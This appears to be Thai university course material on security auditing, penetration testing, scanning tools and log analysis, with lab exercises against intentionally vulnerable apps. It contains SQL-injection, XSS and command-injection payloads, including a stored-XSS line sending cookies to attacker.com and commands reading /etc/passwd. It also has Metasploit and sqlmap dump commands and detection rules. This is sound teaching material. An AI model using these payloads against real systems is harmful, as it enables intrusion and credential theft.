# การตรวจสอบและวิเคราะห์ความปลอดภัย
## สัปดาห์ที่ 9: Security Auditing & Vulnerability Assessment

---

## หัวข้อเนื้อหา
### 🎯 หัวข้อหลัก
1. Security Auditing และ Vulnerability Assessment
2. Penetration Testing Methodology
3. Security Scanning Tools
4. Log Analysis และ Monitoring

### 📚 วัตถุประสงค์การเรียนรู้
- เข้าใจหลักการและกระบวนการ Security Auditing
- สามารถประเมินความเสี่ยงและจุดอ่อนของระบบ
- ใช้เครื่องมือตรวจสอบความปลอดภัยได้อย่างมีประสิทธิภาพ
- วิเคราะห์ Log และสร้างระบบ Monitoring

---

# ส่วนที่ 1: Security Auditing พื้นฐาน

## 1.1 ความหมายของ Security Auditing

**Security Auditing** คือ กระบวนการตรวจสอบและประเมินความปลอดภัยของระบบ IT อย่างเป็นระบบ เพื่อ:

- **ระบุช่องโหว่** (Vulnerabilities) ในระบบ
- **ประเมินความเสี่ยง** (Risk Assessment)
- **ตรวจสอบการปฏิบัติตาม** มาตรฐานความปลอดภัย
- **แนะนำแนวทางแก้ไข** ปรับปรุงระบบ

### CIA Triad Model
ความปลอดภัยของข้อมูลยึดหลัก 3 C:

- **Confidentiality (ความลับ)** - ข้อมูลถูกเข้าถึงโดยผู้มีสิทธิเท่านั้น
- **Integrity (ความถูกต้อง)** - ข้อมูลไม่ถูกเปลี่ยนแปลงโดยไม่ได้รับอนุญาต  
- **Availability (ความพร้อมใช้)** - ข้อมูลพร้อมใช้งานเมื่อต้องการ

---

## 1.2 ประเภทของ Security Audit

### 1. Internal Audit (การตรวจสอบภายใน)
- ดำเนินการโดยทีมงานภายในองค์กร
- มุ่งเน้นการปรับปรุงระบบอย่างต่อเนื่อง
- **ข้อดี:** ความเข้าใจลึกในระบบ, ต้นทุนต่ำ
- **ข้อเสีย:** อาจขาดมุมมองภายนอก, bias

### 2. External Audit (การตรวจสอบภายนอก)
- ดำเนินการโดยผู้เชี่ยวชาญจากภายนอก
- มุมมองเป็นกลางและเป็นอิสระ
- **ข้อดี:** ความเชี่ยวชาญสูง, มุมมองใหม่
- **ข้อเสี่ย:** ต้นทุนสูง, ความเข้าใจระบบน้อย

### 3. Third-Party Audit
- การตรวจสอบโดยหน่วยงานรับรองมาตรฐาน
- เช่น ISO 27001, SOC 2, PCI DSS

---

## 1.3 Security Audit Framework

### NIST Cybersecurity Framework
กรอบงานที่แบ่งเป็น 5 ฟังก์ชันหลัก:

1. **Identify** - ระบุทรัพย์สินและความเสี่ยง
2. **Protect** - ใช้มาตรการป้องกัน
3. **Detect** - ตรวจจับภัยคุกคาม
4. **Respond** - ตอบสนองต่อเหตุการณ์
5. **Recover** - กู้คืนระบบ

### ISO 27001 Controls
มาตรฐานสากลที่กำหนด 114 ตัวควบคุม:
- **ความปลอดภัยข้อมูล** (Information Security)
- **การจัดการความเสี่ยง** (Risk Management)
- **การควบคุมการเข้าถึง** (Access Control)

---

# ส่วนที่ 2: Vulnerability Assessment

## 2.1 ความหมายและประเภท

**Vulnerability Assessment** คือ กระบวนการค้นหาและประเมินจุดอ่อนในระบบ

### ประเภทของ Vulnerability
1. **Technical Vulnerabilities**
   - Software bugs, Configuration errors
   - Network vulnerabilities
   - Hardware weaknesses

2. **Physical Vulnerabilities**
   - Unsecured facilities
   - Equipment theft
   - Environmental risks

3. **Human Vulnerabilities**
   - Social engineering
   - Insider threats
   - Lack of training

---

## 2.2 Vulnerability Assessment Process

### ขั้นตอนที่ 1: Planning & Scoping
```
กิจกรรม:
✓ กำหนดขอบเขตการตรวจสอบ
✓ ระบุระบบเป้าหมาย
✓ เตรียมเครื่องมือและทรัพยากร
✓ ขอความอนุญาตและประสานงาน
```

### ขั้นตอนที่ 2: Discovery & Scanning
```
เครื่องมือที่ใช้:
• Network Scanners (Nmap, Masscan)
• Vulnerability Scanners (Nessus, OpenVAS)
• Web Application Scanners (OWASP ZAP, Burp Suite)
```

### ขั้นตอนที่ 3: Analysis & Prioritization
**CVSS (Common Vulnerability Scoring System)**
- **Critical:** 9.0-10.0 - แก้ไขทันที
- **High:** 7.0-8.9 - แก้ไขภายใน 1 สัปดาห์
- **Medium:** 4.0-6.9 - แก้ไขภายใน 1 เดือน
- **Low:** 0.1-3.9 - ติดตามและวางแผน

### ขั้นตอนที่ 4: Reporting & Remediation
```
รายงานควรประกอบด้วย:
1. Executive Summary
2. Risk Assessment
3. Detailed Findings
4. Remediation Recommendations
5. Implementation Timeline
```

---

## 2.3 ตัวอย่างสถานการณ์จริง

### กรณีศึกษา: บริษัท E-Commerce
**สถานการณ์:** บริษัทค้าขายออนไลน์ต้องการตรวจสอบความปลอดภัยของเว็บไซต์

**ผลการตรวจสอบ:**
- ❌ **SQL Injection** ในหน้า Login (CVSS: 9.8)
- ❌ **XSS** ในส่วนค้นหา (CVSS: 7.4)
- ❌ **Weak Password Policy** (CVSS: 5.3)
- ❌ **Missing HTTPS** on payment page (CVSS: 8.1)

**แนวทางแก้ไข:**
1. **Immediate:** ปิดช่องโหว่ SQL Injection และเปิดใช้ HTTPS
2. **Short-term:** แก้ไข XSS และปรับ Password Policy
3. **Long-term:** ติดตั้งระบบ WAF และการฝึกอบรม

---

# ส่วนที่ 3: Penetration Testing Methodology

## 3.1 ความแตกต่างระหว่าง VA และ Pen Test

| Vulnerability Assessment | Penetration Testing |
|-------------------------|-------------------|
| ระบุจุดอ่อน | ทดสอบการโจมตีจริง |
| Automated Scanning | Manual Testing |
| รายงานรายชื่อช่องโหว่ | พิสูจน์การใช้ประโยชน์ |
| กว้างแต่ไม่ลึก | แคบแต่ลึก |

---

## 3.2 Penetration Testing Frameworks

### 1. OWASP Testing Guide
**10 อันดับช่องโหว่ที่พบบ่อย (OWASP Top 10 2021):**

1. **A01 - Broken Access Control**
2. **A02 - Cryptographic Failures**  
3. **A03 - Injection** (SQL, XSS, Command)
4. **A04 - Insecure Design**
5. **A05 - Security Misconfiguration**
6. **A06 - Vulnerable Components**
7. **A07 - Identification & Authentication Failures**
8. **A08 - Software & Data Integrity Failures**
9. **A09 - Security Logging & Monitoring Failures**
10. **A10 - Server-Side Request Forgery (SSRF)**

### 2. PTES (Penetration Testing Execution Standard)
7 ขั้นตอนหลัก:

1. **Pre-engagement** - วางแผนและกำหนดขอบเขต
2. **Intelligence Gathering** - รวบรวมข้อมูล
3. **Threat Modeling** - วิเคราะห์ภัยคุกคาม
4. **Vulnerability Analysis** - ตรวจหาช่องโหว่
5. **Exploitation** - ทดสอบการโจมตี
6. **Post Exploitation** - ขยายการควบคุม
7. **Reporting** - จัดทำรายงาน

---

## 3.3 ประเภทของ Penetration Testing

### 1. Black Box Testing
- **ข้อมูล:** ไม่มีข้อมูลภายในระบบ
- **วิธีการ:** โจมตีแบบผู้บุกรุกจริง
- **ข้อดี:** มุมมองจากภายนอก, สถานการณ์จริง

### 2. White Box Testing  
- **ข้อมูล:** มีข้อมูลครบถ้วนของระบบ
- **วิธีการ:** ทดสอบแบบละเอียด
- **ข้อดี:** ครอบคลุม, ประหยัดเวลา

### 3. Gray Box Testing
- **ข้อมูล:** มีข้อมูลบางส่วน
- **วิธีการ:** ผสมผสานทั้งสองแบบ
- **ข้อดี:** สมดุลระหว่างความครอบคลุมและความจริง

---

## 3.4 การทำ Pen Test ในทางปฏิบัติ

### Phase 1: Reconnaissance (การสำรวจ)
**Passive Information Gathering:**
```bash
# ค้นหาข้อมูลจาก WHOIS
whois example.com

# ค้นหา Subdomain
subfinder -d example.com
amass enum -d example.com

# Google Dorking
site:example.com filetype:pdf
site:example.com intext:"password"
```

**Active Information Gathering:**
```bash
# Port Scanning ด้วย Nmap
nmap -sS -T4 -A target.com
nmap --script vuln target.com

# Service Detection
nmap -sV -p 80,443,22,21 target.com
```

### Phase 2: Vulnerability Scanning
```bash
# ใช้ Nessus (Commercial)
# ใช้ OpenVAS (Open Source)

# Web Application Testing
nikto -h http://target.com
dirb http://target.com
gobuster dir -u http://target.com -w /usr/share/wordlists/common.txt
```

### Phase 3: Exploitation
**ตัวอย่าง SQL Injection Test:**
```sql
-- Basic Test
' OR '1'='1

-- Union Based
' UNION SELECT 1,2,3--

-- Error Based  
' AND (SELECT COUNT(*) FROM information_schema.tables)>0--

-- Time Based
' AND (SELECT SLEEP(5))--
```

**ตัวอย่าง XSS Test:**
```html
<!-- Reflected XSS -->
<script>alert('XSS')</script>

<!-- DOM XSS -->
<img src=x onerror=alert('XSS')>

<!-- Stored XSS -->
<iframe src="javascript:alert('XSS')"></iframe>
```

---

# ส่วนที่ 4: Security Scanning Tools

## 4.1 Network Security Tools

### 1. Nmap (Network Mapper)
**การใช้งานพื้นฐาน:**
```bash
# Basic scan
nmap 192.168.1.1

# SYN Stealth scan
nmap -sS target.com

# Service version detection
nmap -sV -p 1-1000 target.com

# OS Detection
nmap -O target.com

# Script scanning
nmap --script default target.com
nmap --script vuln target.com
```

**ตัวอย่างผลลัพธ์:**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.41
443/tcp  open  https   Apache httpd 2.4.41
3306/tcp open  mysql   MySQL 8.0.28
```

### 2. Masscan
**การสแกนที่รวดเร็ว:**
```bash
# Scan all ports quickly  
masscan -p1-65535 192.168.1.0/24 --rate=1000

# Scan specific ports on large networks
masscan -p80,443 0.0.0.0/0 --rate=10000
```

---

## 4.2 Vulnerability Scanners

### 1. OpenVAS (Open Source)
**คุณสมบัติหลัก:**
- **Network Vulnerability Testing**
- **Web Application Testing**  
- **Database Security Testing**
- **Configuration Assessment**

**การติดตั้งและใช้งาน:**
```bash
# Installation on Kali Linux
apt-get install openvas

# Initialize 
gvm-setup

# Start services
gvm-start

# Access via web: https://localhost:9392
```

### 2. Nessus (Commercial)
**คุณสมบัติเด่น:**
- **Advanced Vulnerability Database**
- **Compliance Checking** (PCI DSS, HIPAA, etc.)
- **Asset Discovery**
- **Risk Prioritization**

### 3. Qualys VMDR
**Enterprise Solution:**
- **Cloud-based Scanning**
- **Continuous Monitoring**
- **Threat Intelligence Integration**
- **Asset Management**

---

## 4.3 Web Application Security Tools

### 1. OWASP ZAP (Zed Attack Proxy)
**การใช้งานพื้นฐาน:**

1. **Manual Explore:**
   - ใช้ browser proxy เพื่อดักจับ HTTP requests
   - วิเคราะห์พฤติกรรมของเว็บแอปพลิเคชัน

2. **Automated Scan:**
   ```
   Target URL: https://example.com
   Attack Mode: 
   ✓ Spider (Crawl website)
   ✓ Active Scan (Test for vulnerabilities)
   ✓ Passive Scan (Monitor traffic)
   ```

3. **Manual Testing:**
   - Intercept requests
   - Modify parameters
   - Test injection points

**ตัวอย่าง Vulnerability Report:**
```
Alert: SQL Injection
Risk: High
URL: https://example.com/search.php?q=test
Parameter: q
Description: Time-based blind SQL injection vulnerability detected
Solution: Use parameterized queries
```

### 2. Burp Suite
**Professional Features:**
- **Intruder** - Automated attack tool
- **Repeater** - Manual request modification
- **Scanner** - Automated vulnerability detection
- **Extensions** - Plugin ecosystem

**การใช้งาน Burp Intruder:**
```
Target: login.php
Position: username=§admin§&password=§password§
Payloads: 
- Wordlist: /usr/share/wordlists/usernames.txt
- Wordlist: /usr/share/wordlists/passwords.txt
Attack Type: Cluster Bomb
```

### 3. Nikto
**Web Server Scanner:**
```bash
# Basic scan
nikto -h http://target.com

# Scan with specific port
nikto -h http://target.com -p 8080

# Save output
nikto -h http://target.com -o results.html -Format htm

# Scan multiple hosts
nikto -h target.com,target2.com
```

**ตัวอย่างผลลัพธ์:**
```
+ /admin/: Admin login page/section found.
+ /backup/: Backup directory found.
+ /config.php: Configuration file found.
+ HTTP method 'PUT' may allow clients to save files on the web server.
+ /phpinfo.php: Output from the phpinfo() function was found.
```

---

## 4.4 Specialized Security Tools

### 1. SQLMap
**Automated SQL Injection Testing:**
```bash
# Basic injection test
sqlmap -u "http://target.com/page.php?id=1"

# POST data testing
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=123"

# Cookie testing
sqlmap -u "http://target.com/page.php" --cookie="sessionid=abc123"

# Database enumeration
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" --tables -D database_name
sqlmap -u "http://target.com/page.php?id=1" --dump -T users -D database_name
```

### 2. Metasploit Framework
**Exploitation Framework:**
```bash
# Start Metasploit
msfconsole

# Search for exploits
search type:exploit platform:linux apache

# Use specific exploit
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 192.168.1.10
set RPORT 80
exploit

# Post exploitation
sessions -l
sessions -i 1
```

### 3. Wireshark
**Network Protocol Analyzer:**
```
Capture Filters:
- host 192.168.1.1 (specific host)
- port 80 (HTTP traffic)
- tcp port 443 (HTTPS traffic)

Display Filters:
- http contains "password"
- tcp.flags.reset == 1
- dns.qry.name contains "malware"
```

---

# ส่วนที่ 5: Log Analysis และ Monitoring

## 5.1 ความสำคัญของ Log Analysis

### ประโยชน์หลัก:
1. **Incident Detection** - ตรวจจับการโจมตี
2. **Forensic Investigation** - การสืบสวนหลักฐาน
3. **Compliance** - ปฏิบัติตามกฎระเบียบ
4. **Performance Monitoring** - ติดตามประสิทธิภาพระบบ

### ประเภทของ Logs:
- **System Logs** (syslog, Windows Event Log)
- **Application Logs** (Apache, IIS, Database)
- **Security Logs** (Firewall, IDS/IPS, Antivirus)
- **Network Logs** (Router, Switch, Proxy)

---

## 5.2 Log Analysis Tools

### 1. ELK Stack (Elasticsearch, Logstash, Kibana)

**Logstash Configuration ตัวอย่าง:**
```ruby
input {
  beats {
    port => 5044
  }
  file {
    path => "/var/log/apache2/access.log"
    start_position => "beginning"
  }
}

filter {
  if [fields][log_type] == "apache" {
    grok {
      match => { 
        "message" => "%{COMBINEDAPACHELOG}" 
      }
    }
    date {
      match => [ "timestamp", "dd/MMM/yyyy:HH:mm:ss Z" ]
    }
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "logs-%{+YYYY.MM.dd}"
  }
}
```

**Kibana Dashboard Features:**
- **Visualization** - กราฟและแผนภูมิ
- **Discovery** - ค้นหาและกรอง logs
- **Dashboard** - รวมข้อมูลแบบ real-time

### 2. Splunk
**Search Processing Language (SPL):**
```splunk
# Basic search
index=web_logs status=404

# Statistical analysis
index=web_logs | stats count by status

# Time-based analysis
index=web_logs | timechart span=1h count by status

# Advanced analysis
index=web_logs 
| where status >= 400 
| eval error_type=case(status>=500, "Server Error", status>=400, "Client Error")
| stats count by error_type, host
| sort -count
```

### 3. SIEM Solutions

**Security Information and Event Management:**

**Popular SIEM Tools:**
- **IBM QRadar**
- **Microsoft Sentinel**
- **LogRhythm**
- **ArcSight**

**SIEM Capabilities:**
1. **Log Collection** - รวบรวม logs จากหลายแหล่ง
2. **Correlation** - หาความเชื่อมโยงระหว่างเหตุการณ์
3. **Alerting** - แจ้งเตือนภัยคุกคาม
4. **Reporting** - รายงานและการปฏิบัติตามกฎระเบียบ

---

## 5.3 Security Monitoring Best Practices

### 1. Log Collection Strategy
```yaml
Critical Logs to Monitor:
  Authentication:
    - Login attempts (success/failure)
    - Privilege escalation
    - Account lockouts
    
  Network:
    - Firewall blocks/allows
    - VPN connections
    - Bandwidth anomalies
    
  System:
    - Service start/stop
    - Configuration changes
    - Resource utilization
    
  Application:
    - Error messages
    - Performance metrics  
    - User activities
```

### 2. Real-time Alerting Rules
**ตัวอย่างกฎการแจ้งเตือน:**

```sql
-- Brute Force Detection
SELECT COUNT(*) as failed_attempts, source_ip
FROM auth_logs 
WHERE event_type = 'LOGIN_FAILED' 
  AND timestamp > NOW() - INTERVAL 5 MINUTE
GROUP BY source_ip 
HAVING failed_attempts > 10

-- Suspicious File Access
SELECT user, file_path, COUNT(*) as access_count
FROM file_access_logs
WHERE timestamp > NOW() - INTERVAL 1 HOUR
  AND file_path LIKE '%password%' 
GROUP BY user, file_path
HAVING access_count > 5

-- Network Anomaly  
SELECT source_ip, destination_port, COUNT(*) as connections
FROM network_logs
WHERE timestamp > NOW() - INTERVAL 10 MINUTE
GROUP BY source_ip, destination_port
HAVING connections > 1000
```

### 3. Incident Response Playbook
**ขั้นตอนการตอบสนอง:**

1. **Detection** - ตรวจจับภัยคุกคาม
   ```
   Alert Triggered → Validate → Classify Severity
   ```

2. **Analysis** - วิเคราะห์เหตุการณ์  
   ```
   Collect Evidence → Timeline Analysis → Impact Assessment
   ```

3. **Containment** - ควบคุมเหตุการณ์
   ```
   Isolate Systems → Block Malicious IPs → Preserve Evidence
   ```

4. **Recovery** - กู้คืนระบบ
   ```
   Remove Malware → Patch Vulnerabilities → Monitor Systems
   ```

5. **Lessons Learned** - บทเรียน
   ```
   Document Incident → Update Procedures → Train Staff
   ```

---

# ส่วนที่ 6: การประยุกต์ใช้ในสถานการณ์จริง

## 6.1 Case Study: การโจมตีแบบ APT

### สถานการณ์:
บริษัทเทคโนโลยีขนาดกลางถูกโจมตีแบบ **Advanced Persistent Threat (APT)**

### Timeline ของการโจมตี:
```
Day 1: Phishing email → Employee clicks malicious link
Day 2: Backdoor installed → C&C communication established  
Day 5: Lateral movement → Domain admin compromised
Day 12: Data exfiltration → Sensitive documents stolen
Day 15: Discovered by security team
```

### การตรวจจับด้วย Log Analysis:

**1. Initial Compromise Detection:**
```bash
# Suspicious DNS queries
grep -i "suspicious-domain.com" /var/log/named/query.log

# Unusual outbound connections
netstat -an | grep ESTABLISHED | awk '{print $5}' | sort | uniq -c | sort -nr
```

**2. Lateral Movement Detection:**
```sql
-- Unusual login patterns
SELECT user, COUNT(DISTINCT source_ip) as unique_ips,
       MIN(login_time) as first_login,
       MAX(login_time) as last_login
FROM auth_logs 
WHERE DATE(login_time) = CURDATE()
GROUP BY user
HAVING unique_ips > 5

-- Service account abuse
SELECT account, service, COUNT(*) as login_count
FROM service_logs
WHERE timestamp > NOW() - INTERVAL 24 HOUR
  AND account LIKE '%admin%'
GROUP BY account, service
ORDER BY login_count DESC
```

**3. Data Exfiltration Detection:**
```python
# Python script to detect unusual data transfer
import pandas as pd

# Load network logs
network_logs = pd.read_csv('network_logs.csv')

# Calculate baseline
baseline = network_logs.groupby('source_ip')['bytes_out'].mean()

# Detect anomalies  
current_traffic = network_logs[network_logs['date'] == 'today']
anomalies = current_traffic[
    current_traffic['bytes_out'] > baseline * 10
]

print("Potential data exfiltration detected:")
print(anomalies[['source_ip', 'destination_ip', 'bytes_out']])
```

---

## 6.2 Automated Security Monitoring

### 1. Security Orchestration Script
```python
#!/usr/bin/env python3
import requests
import json
from datetime import datetime, timedelta

class SecurityMonitor:
    def __init__(self):
        self.alerts = []
        
    def check_failed_logins(self):
        """Check for brute force attacks"""
        # Query log database
        query = """
        SELECT source_ip, COUNT(*) as attempts
        FROM auth_logs 
        WHERE result = 'FAILED' 
          AND timestamp > %s
        GROUP BY source_ip 
        HAVING attempts > 10
        """
        
        since = datetime.now() - timedelta(minutes=5)
        results = self.execute_query(query, [since])
        
        for row in results:
            alert = {
                'type': 'BRUTE_FORCE',
                'severity': 'HIGH',
                'source_ip': row[0],
                'attempts': row[1],
                'timestamp': datetime.now()
            }
            self.alerts.append(alert)
            
    def check_malware_connections(self):
        """Check for C&C communications"""
        threat_intel_urls = [
            "https://reputation-db.example.com/malicious-ips",
            "https://threat-feed.example.com/c2-domains"
        ]
        
        malicious_indicators = []
        for url in threat_intel_urls:
            response = requests.get(url)
            malicious_indicators.extend(response.json())
            
        # Check against network logs
        for indicator in malicious_indicators:
            if self.check_network_connection(indicator):
                alert = {
                    'type': 'MALWARE_C2',
                    'severity': 'CRITICAL',
                    'indicator': indicator,
                    'timestamp': datetime.now()
                }
                self.alerts.append(alert)
                
    def send_alert(self, alert):
        """Send alert to security team"""
        webhook_url = "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
        
        message = {
            "text": f"🚨 Security Alert: {alert['type']}",
            "attachments": [{
                "color": "danger" if alert['severity'] == 'CRITICAL' else "warning",
                "fields": [
                    {"title": "Severity", "value": alert['severity'], "short": True},
                    {"title": "Time", "value": str(alert['timestamp']), "short": True},
                    {"title": "Details", "value": json.dumps(alert, indent=2), "short": False}
                ]
            }]
        }
        
        requests.post(webhook_url, json=message)
        
    def run_monitoring(self):
        """Main monitoring loop"""
        self.check_failed_logins()
        self.check_malware_connections()
        
        # Process alerts
        for alert in self.alerts:
            self.send_alert(alert)
            
        return len(self.alerts)

# Usage
if __name__ == "__main__":
    monitor = SecurityMonitor()
    alerts_count = monitor.run_monitoring()
    print(f"Processed {alerts_count} security alerts")
```

### 2. Custom IDS Rules (Suricata)
```bash
# HTTP-based attacks
alert http any any -> $HOME_NET any (
    msg:"Possible SQL Injection attempt";
    flow:established,to_server;
    content:"union"; nocase;
    content:"select"; nocase;
    distance:0;
    within:100;
    sid:1000001;
    rev:1;
)

# Suspicious file downloads
alert http $HOME_NET any -> any any (
    msg:"Suspicious executable download";
    flow:established,from_server;
    fileext:"exe";
    filemagic:"PE32 executable";
    sid:1000002;
    rev:1;
)

# Cryptomining detection
alert dns any any -> any any (
    msg:"Possible cryptomining pool connection";
    dns_query;
    content:"pool."; 
    content:"mining"; distance:0; within:20;
    sid:1000003;
    rev:1;
)
```

---

# ส่วนที่ 7: LAB Workshop - Security Assessment Project

## 7.1 Lab Overview
**โครงการ:** การประเมินความปลอดภัยของระบบเว็บแอปพลิเคชัน

**วัตถุประสงค์:**
- ทำความเข้าใจกระบวนการ Security Assessment แบบครบวงจร
- ใช้เครื่องมือตรวจสอบความปลอดภัยในทางปฏิบัติ
- วิเคราะห์ผลการตรวจสอบและเสนอแนะแนวทางแก้ไข
- จัดทำรายงานผลการประเมินความปลอดภัย

---

## 7.2 Lab Environment Setup

### ความต้องการของระบบ:
```yaml
Required Software:
  - VirtualBox หรือ VMware
  - Kali Linux (Latest version)
  - DVWA (Damn Vulnerable Web Application)
  - Metasploitable 2/3
  - Docker (สำหรับ container labs)

Network Configuration:
  - Host-only network สำหรับ isolated testing
  - NAT network สำหรับ internet access
  - กำหนด IP range: 192.168.56.0/24
```

### การติดตั้ง Lab Environment:
```bash
# 1. Download และติดตั้ง Kali Linux
wget https://cdimage.kali.org/kali-2024.1/kali-linux-2024.1-vmware-amd64.7z

# 2. ติดตั้ง DVWA
git clone https://github.com/digininja/DVWA.git
cd DVWA
docker-compose up -d

# 3. ติดตั้ง Vulnerable Applications
docker run -d -p 8080:8080 webgoat/webgoat-8.0
docker run -d -p 3000:3000 bkimminich/juice-shop

# 4. ตรวจสอบการทำงาน
nmap -sV 192.168.56.101-110
```

---

## 7.3 Lab Exercises

### Exercise 1: Network Discovery & Reconnaissance

**เป้าหมาย:** ค้นหาและระบุระบบเป้าหมายในเครือข่าย

**ขั้นตอนการทำ Lab:**

1. **Network Scanning**
```bash
# Step 1: Ping sweep
nmap -sn 192.168.56.0/24

# Step 2: Port scanning
nmap -sS -T4 -p 1-1000 [target_ip]

# Step 3: Service enumeration  
nmap -sV -sC -p [open_ports] [target_ip]

# Step 4: OS detection
nmap -O [target_ip]
```

2. **Information Gathering**
```bash
# Web technology identification
whatweb http://[target_ip]

# Directory enumeration
dirb http://[target_ip] /usr/share/wordlists/dirb/common.txt

# Subdomain enumeration (if domain available)
subfinder -d target-domain.com
```

**คำถามสำหรับนักศึกษา:**
- ระบบเป้าหมายมี services อะไรทำงานอยู่บ้าง?
- พบช่องโหว่ที่น่าสนใจหรือไม่?
- ข้อมูลที่ได้จาก reconnaissance สามารถใช้วางแผนการโจมตีอย่างไร?

### Exercise 2: Web Application Vulnerability Assessment

**เป้าหมาย:** ตรวจสอบช่องโหว่ในเว็บแอปพลิเคชัน DVWA

**การตั้งค่า DVWA:**
```bash
# เข้าถึง DVWA
http://192.168.56.101/DVWA

# Login credentials
Username: admin
Password: password

# ตั้งค่า Security Level
Security Level: Low (สำหรับเริ่มต้น)
```

**1. SQL Injection Testing:**
```sql
# Basic test payloads
1' OR '1'='1
1' UNION SELECT 1,2--
1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--

# Automated testing
sqlmap -u "http://192.168.56.101/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=...; security=low" --dbs
```

**2. Cross-Site Scripting (XSS) Testing:**
```html
<!-- Reflected XSS payloads -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
"><script>alert(document.cookie)</script>

<!-- Stored XSS testing -->
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```

**3. Command Injection Testing:**
```bash
# Basic command injection
127.0.0.1; ls -la
127.0.0.1 && cat /etc/passwd  
127.0.0.1 | whoami
```

**รายงานที่ต้องจัดทำ:**
- ประเภทช่องโหว่ที่พบ และ severity level
- ขั้นตอนการทดสอบ (step-by-step)
- Screenshot หลักฐาน
- แนวทางแก้ไขที่เสนอแนะ

### Exercise 3: Automated Vulnerability Scanning

**เป้าหมาย:** ใช้เครื่องมือ automated scanning

**1. OpenVAS Scanning:**
```bash
# เริ่ม OpenVAS services
gvm-start

# เข้าถึง web interface
https://localhost:9392

# สร้าง scan task ใหม่
Target: 192.168.56.101
Scanner: OpenVAS Scanner
Scan Config: Full and fast
```

**2. Nessus Scanning (ถ้ามี):**
```
1. สร้าง Basic Network Scan
2. กำหนด target IP range
3. รันการสแกนและรอผลลัพธ์
4. วิเคราะห์ vulnerability report
```

**3. OWASP ZAP Automated Scan:**
```bash
# Command line scanning
zap-baseline.py -t http://192.168.56.101/DVWA/

# หรือใช้ GUI mode
# Quick Start -> Automated Scan -> URL: http://target
```

**การเปรียบเทียบผลลัพธ์:**
- เปรียบเทียบผลการสแกนจากเครื่องมือต่างๆ
- วิเคราะห์ false positive/negative
- ประเมินประสิทธิภาพของแต่ละเครื่องมือ

### Exercise 4: Log Analysis Workshop

**เป้าหมาย:** วิเคราะห์ log files เพื่อตรวจจับกิจกรรมที่น่าสงสัย

**1. Apache Log Analysis:**
```bash
# ตัวอย่าง Apache access log
192.168.1.100 - - [15/Sep/2024:10:15:23 +0000] "GET /admin/login.php HTTP/1.1" 200 1234
192.168.1.200 - - [15/Sep/2024:10:15:45 +0000] "POST /login.php HTTP/1.1" 401 567  
192.168.1.200 - - [15/Sep/2024:10:15:46 +0000] "POST /login.php HTTP/1.1" 401 567
192.168.1.200 - - [15/Sep/2024:10:15:47 +0000] "POST /login.php HTTP/1.1" 401 567

# การวิเคราะห์ด้วย command line
# หา IP ที่มี failed login attempts มาก
awk '$9 == "401" {print $1}' access.log | sort | uniq -c | sort -nr

# หา requests ที่น่าสงสัย
grep -i "union\|select\|script\|alert" access.log

# วิเคราะห์ traffic patterns
awk '{print $4}' access.log | cut -d: -f2 | sort | uniq -c
```

**2. Security Event Analysis:**
```python
#!/usr/bin/env python3
import re
from collections import Counter
from datetime import datetime

def analyze_security_logs(log_file):
    """วิเคราะห์ security logs"""
    
    # Patterns to detect
    sql_injection = re.compile(r'(union|select|insert|update|delete|drop)', re.IGNORECASE)
    xss_attempt = re.compile(r'(<script|javascript:|onerror=)', re.IGNORECASE)
    directory_traversal = re.compile(r'(\.\./|\.\.\\)', re.IGNORECASE)
    
    suspicious_ips = Counter()
    attack_types = Counter()
    
    with open(log_file, 'r') as f:
        for line in f:
            # Extract IP address
            ip_match = re.match(r'^(\d+\.\d+\.\d+\.\d+)', line)
            if ip_match:
                ip = ip_match.group(1)
                
                # Check for different attack types
                if sql_injection.search(line):
                    attack_types['SQL Injection'] += 1
                    suspicious_ips[ip] += 1
                    
                elif xss_attempt.search(line):
                    attack_types['XSS'] += 1
                    suspicious_ips[ip] += 1
                    
                elif directory_traversal.search(line):
                    attack_types['Directory Traversal'] += 1
                    suspicious_ips[ip] += 1
    
    # รายงานผลการวิเคราะห์
    print("=== Security Log Analysis Report ===")
    print("\nTop 10 Suspicious IPs:")
    for ip, count in suspicious_ips.most_common(10):
        print(f"{ip}: {count} suspicious requests")
    
    print("\nAttack Types Detected:")
    for attack_type, count in attack_types.items():
        print(f"{attack_type}: {count} attempts")

# Usage
analyze_security_logs('access.log')
```

**3. ELK Stack Setup (Optional Advanced Lab):**
```yaml
# docker-compose.yml
version: '3.8'
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.5.0
    environment:
      - discovery.type=single-node
      - "ES_JAVA_OPTS=-Xms512m -Xmx512m"
    ports:
      - "9200:9200"
      
  kibana:
    image: docker.elastic.co/kibana/kibana:8.5.0
    ports:
      - "5601:5601"
    environment:
      - ELASTICSEARCH_URL=http://elasticsearch:9200
    depends_on:
      - elasticsearch
      
  logstash:
    image: docker.elastic.co/logstash/logstash:8.5.0
    volumes:
      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf
    depends_on:
      - elasticsearch
```

---

## 7.4 Final Project Assignment

### โครงงาน: Security Assessment Report

**รายละเอียดโครงงาน:**
นักศึกษาต้องทำการประเมินความปลอดภัยของระบบเป้าหมายที่กำหนดให้ และจัดทำรายงานแบบมืออาชีพ

**เป้าหมายที่ให้เลือก:**
1. **DVWA** - เว็บแอปพลิเคชันที่มีช่องโหว่ตั้งใจ
2. **Metasploitable** - ระบบ Linux ที่มีช่องโหว่หลายประเภท
3. **WebGoat** - แพลตฟอร์มเรียนรู้ security testing
4. **Juice Shop** - Modern web application vulnerabilities

**ขอบเขตงาน:**
- ทำการตรวจสอบภายใน 2 สัปดาห์
- ใช้เครื่องมืออย่างน้อย 3 ประเภท (Network scanner, Web scanner, Manual testing)
- จัดทำรายงานความยาว 15-20 หน้า
- นำเสนอผลงานต่อหน้าชั้นเรียน (15 นาที)

### รูปแบบรายงานที่ต้องการ:

**1. Executive Summary (2 หน้า)**
```
- ภาพรวมการประเมิน
- สรุปช่องโหว่ที่พบ (แยกตาม severity)
- ผลกระทบต่อองค์กร
